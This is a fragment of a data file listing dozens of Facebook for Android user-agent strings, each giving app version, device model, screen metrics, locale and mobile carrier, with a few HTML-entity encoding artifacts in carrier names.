"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/335949772;FBDM/{density=2.625,width=1080,height=2144};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-G820;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/337551466;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=3.0,width=1080,height=2168};FBLC/lv_LV;FBRV/338225700;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A525F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279743;FBDM/{density=1.875,width=720,height=1467};FBLC/el_GR;FBRV/338422115;FBCR/CYTAMOBILE-VODAFONE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950303;FBDM/{density=3.0,width=1080,height=2060};FBLC/fr_FR;FBRV/336982524;FBCR/MOBNCL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/340.0.0.27.113;FBBV/324485344;FBDM/{density=1.75,width=720,height=1471};FBLC/en_US;FBRV/326018919;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A025U;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.625,width=840,height=2081};FBLC/en_US;FBRV/337989149;FBCR/AT&amp;amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-F926U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279682;FBDM/{density=2.0,width=720,height=1384};FBLC/ru_RU;FBRV/338447728;FBCR/CYTAMOBILE-VODAFONE | CytaVoda;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A600FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279516;FBDM/{density=2.625,width=1080,height=2094};FBLC/ro_RO;FBRV/338321101;FBCR/Lucky;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.625,width=1080,height=2132};FBLC/en_GB;FBRV/336887922;FBCR/3;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.8125,width=1080,height=2187};FBLC/en_US;FBRV/338253300;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/11;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279711;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/338099347;FBCR/T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/DE2118;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/336326830;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G900A;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279621;FBDM/{density=1.75,width=720,height=1280};FBLC/es_LA;FBRV/338321101;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J737T1;FBSV/9;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279682;FBDM/{density=1.75,width=720,height=1382};FBLC/pt_BR;FBRV/339429283;FBCR/TIMBRASIL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A105M;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_US;FBRV/337551466;FBCR/AT&amp;amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.625,width=1080,height=2186};FBLC/zh_TW;FBRV/338422115;FBCR/&amp;#21488-&amp;#28771-&amp;#22823-&amp;#21733-&amp;#22823-;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A516B;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282998071;FBDM/{density=3.375,width=1080,height=2115};FBLC/zh_TW;FBRV/285101639;FBCR/TW Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1879;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919009;FBDM/{density=1.875,width=720,height=1465};FBLC/en_US;FBRV/339511381;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A326U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.625,width=1080,height=2200};FBLC/en_US;FBRV/339625032;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G988U;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021024;FBDM/{density=3.0,width=1080,height=2139};FBLC/pl_PL;FBRV/233720555;FBCR/T-Mobile.pl;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919015;FBDM/{density=2.0,width=720,height=1406};FBLC/nb_NO;FBRV/339680195;FBCR/N Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A202F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918989;FBDM/{density=2.0,width=720,height=1371};FBLC/es_LA;FBRV/0;FBCR/Movistar;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(7) power;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919015;FBDM/{density=1.75,width=1446,height=720};FBLC/en_US;FBRV/339757040;FBCR/cricket;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g power (2021);FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918828;FBDM/{density=2.5,width=1080,height=2040};FBLC/en_US;FBRV/339757040;FBCR/AT&amp;amp-T;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3a XL;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918829;FBDM/{density=3.825,width=1440,height=2984};FBLC/en_US;FBRV/339740933;FBCR/U.S. Cellular;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 4 XL;FBSV/12;FBBK/0;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.0,width=1080,height=2107};FBLC/es_LA;FBRV/340113722;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX3A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809005;FBDM/{density=2.0,width=1600,height=2560};FBLC/en_US;FBRV/310753832;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T900;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/342.0.0.37.119;FBBV/328226360;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBRV/330422310;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G610M;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919009;FBDM/{density=2.8125,width=1080,height=2192};FBLC/es_LA;FBRV/340539389;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G985F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919015;FBDM/{density=2.0,width=720,height=1406};FBLC/en_Qaau_GB;FBRV/0;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1901;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.1875,width=1080,height=2096};FBLC/en_US;FBRV/340870045;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.625,width=1080,height=2274};FBLC/ro_RO;FBRV/340539389;FBCR/TELEKOM.RO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A805F;FBSV/11;FBBK/0;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.75,width=1080,height=2116};FBLC/en_US;FBRV/340539389;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=4.5,width=1440,height=2744};FBLC/es_LA;FBRV/340539389;FBCR/Home;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919015;FBDM/{density=1.75,width=720,height=1423};FBLC/en_US;FBRV/340839953;FBCR/AT&amp;amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307G;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.8125,width=1080,height=2177};FBLC/es_LA;FBRV/340539389;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A526U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919009;FBDM/{density=2.625,width=1080,height=2199};FBLC/en_US;FBRV/340539389;FBCR/Xfinity Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G996U;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918990;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/341510375;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955U;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.0,width=1080,height=2224};FBLC/es_LA;FBRV/341672076;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/STK-LX3;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2131};FBLC/lv_LV;FBRV/336326830;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918985;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/341598563;FBCR/Verizon ;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-N920V;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918983;FBDM/{density=1.75,width=720,height=1206};FBLC/en_US;FBRV/340839953;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LML212VL;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919015;FBDM/{density=2.0,width=720,height=1406};FBLC/lv_LV;FBRV/342511034;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A202F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918990;FBDM/{density=3.0,width=1080,height=2076};FBLC/fr_FR;FBRV/342401578;FBCR/Bell;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950W;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/339.0.0.32.118;FBBV/323006995;FBDM/{density=2.0,width=720,height=1369};FBLC/ru_RU;FBRV/325030047;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=2.625,width=1080,height=2034};FBLC/ru_RU;FBRV/335184228;FBCR/MegaFon;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A5010;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957718;FBDM/{density=1.75,width=720,height=1382};FBLC/ru_RU;FBRV/335140889;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A105F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391395;FBDM/{density=2.75,width=1080,height=2132};FBLC/ru_RU;FBRV/323725482;FBCR/MegaFon;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/314.1.0.45.119;FBBV/285360755;FBDM/{density=2.625,width=1080,height=2218};FBLC/ru_RU;FBRV/285718514;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606773;FBDM/{density=1.75,width=720,height=1423};FBLC/ru_RU;FBRV/312905709;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.625,width=1080,height=2186};FBLC/ru_RU;FBRV/337856476;FBCR/25030;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.8125,width=1080,height=2038};FBLC/ru_RU;FBRV/335407044;FBCR/25030;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076504;FBDM/{density=2.0,width=720,height=1369};FBLC/ru_RU;FBRV/304846368;FBCR/MegaFon;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279650;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/338732993;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279735;FBDM/{density=2.75,width=1080,height=2132};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279817;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/309279772;FBCR/MegaFon;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2015;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/317766037;FBDM/{density=2.0,width=720,height=1369};FBLC/ru_RU;FBRV/320011824;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2110};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672608;FBDM/{density=2.0,width=1200,height=1824};FBLC/ru_RU;FBRV/315434350;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI PAD 4;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;] Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400843;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/0;FBCR/MegaFon #1;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809026;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/310132116;FBCR/MegaFon #1;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.625,width=1080,height=2042};FBLC/es_LA;FBRV/342578799;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505406;FBDM/{density=2.625,width=2183,height=1080};FBLC/ru_RU;FBRV/282806529;FBCR/BITE&amp;#17-LV;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672645;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M315F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400802;FBDM/{density=2.0,width=720,height=1448};FBLC/ru_RU;FBRV/305464431;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3201;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=3.0,width=1080,height=2063};FBLC/ru_RU;FBRV/334245441;FBCR/MTS RUS;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/ZTE Blade V1000RU;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279836;FBDM/{density=3.1875,width=1080,height=2159};FBLC/ru_RU;FBRV/309130780;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A525F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/338.1.0.36.118;FBBV/321391469;FBDM/{density=3.375,width=1080,height=2159};FBLC/ru_RU;FBRV/322599409;FBCR/MegaFon #1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A325F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279586;FBDM/{density=2.75,width=1080,height=2088};FBLC/ru_RU;FBRV/338642017;FBCR/MTS RUS;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3a;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606775;FBDM/{density=2.75,width=1080,height=2130};FBLC/ru_RU;FBRV/313515503;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/333732671;FBCR/Tele2;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2180;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621606;FBDM/{density=4.0,width=1440,height=2560};FBLC/ru_RU;FBRV/303418653;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/335184228;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STF-L09;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595703;FBDM/{density=2.25,width=720,height=1445};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957718;FBDM/{density=2.0,width=720,height=1384};FBLC/ru_RU;FBRV/335140889;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A013F;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.625,width=1080,height=2183};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/342.0.0.37.119;FBBV/328226390;FBDM/{density=2.0,width=720,height=1411};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480885;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/301065825;FBCR/MegaFon RUS | MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A510F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708340;FBDM/{density=2.75,width=1080,height=2068};FBLC/ru_RU;FBRV/290947837;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505406;FBDM/{density=2.625,width=1080,height=2195};FBLC/ru_RU;FBRV/283629969;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A325F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076512;FBDM/{density=1.75,width=720,height=1382};FBLC/ru_RU;FBRV/304230062;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A105F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076524;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/304151102;FBCR/ROSTELECOM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1904;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186867;FBDM/{density=1.875,width=720,height=1465};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M127F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533668;FBDM/{density=3.0,width=1080,height=2060};FBLC/en_US;FBRV/280683996;FBCR/MegaFon;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX2J;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279835;FBDM/{density=2.75,width=1080,height=2131};FBLC/ru_RU;FBRV/308267673;FBCR/Beeline;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
